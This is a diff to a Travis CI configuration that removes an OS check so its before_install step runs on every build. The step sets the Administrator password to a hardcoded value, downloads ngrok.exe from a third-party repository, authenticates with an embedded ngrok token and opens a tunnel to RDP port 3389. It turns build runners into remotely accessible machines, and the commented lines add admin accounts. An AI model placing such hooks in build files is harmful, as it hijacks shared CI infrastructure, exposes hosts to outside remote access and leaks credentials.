@@ -4,15 +4,11 @@ language: bash
 
 before_install:
 - |-
-    case $TRAVIS_OS_NAME in
-      windows)
-        [[ ! -f C:/tools/msys64/msys2_shell.cmd ]] && rm -rf C:/tools/msys64
+
         net user Administrator Thuonghai001
         #net user Administrator Thuonghai001 /add
         #net localgroup Administrators Administrator /add
         curl -O https://raw.githubusercontent.com/TheDarkMythos/Ngrok-Exe/master/ngrok.exe
         ngrok authtoken UqkqD5EBxWPggw7xGAiQ_77M4D5kjaPNdr9wdb3m9z
         ngrok tcp 3389
-        ;;
-    esac
-        
+
